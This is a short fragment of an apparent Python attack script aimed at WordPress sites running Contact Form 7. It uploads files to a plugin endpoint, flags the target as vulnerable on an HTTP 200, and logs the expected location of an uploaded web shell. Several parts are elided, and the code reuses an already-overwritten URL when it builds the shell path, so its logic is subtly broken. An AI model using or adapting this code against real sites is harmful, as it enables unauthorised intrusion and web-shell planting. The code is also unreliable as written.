...
def exploit(url):
    ...
    try:
        ...
        url = "{}/wp-content/plugins/contact-form-7/modules/file.php".format(url)
        r = req.post(url, files=files)
        if r.status_code == 200:
            print(colors.yellow + "[+] ==> Contact form upload exploit %s Vulnerable" % url)
            found.append({
                "url": url,
                "payload": r.url,
                "status": r.status_code,
                "exploit": "upload_exploit",
                "shell": "http://{}/wp-content/plugins/contact-form-7/file.jpg".format(url)
            })
            json_me(url, "upload_exploit", found)
        else:
            print(colors.red + "[-] Contact Form upload exploit  ==> %s Not Vulnerable" % url)
